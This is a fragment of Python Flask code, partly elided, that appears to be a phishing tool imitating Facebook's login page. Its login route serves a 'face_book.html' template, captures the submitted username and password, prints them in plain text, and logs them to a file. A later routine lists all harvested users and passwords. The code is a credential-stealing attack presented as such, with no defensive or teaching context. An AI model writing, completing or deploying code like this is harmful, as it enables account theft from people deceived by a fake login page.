...
try:
    ...
    def login():
        ...
        print("[FACE LOG] user logging in *fingers crossed*")
        if(request.method == 'POST'):
            username = request.form.get('username')
            password = request.form.get('password')

            #note: add a redirect after facebook login also authentication check for facebook
            print("[FACE] user logged in!")
            print("USER: ", username)
            print("PASS: ", password)
            print("[FACE FILE] saving file...")
        ...
        return render_template("face_book.html")
    ...
    os.system("clear")
    print("[FACE] all logged users + passowrds")
    x = len(log_user)
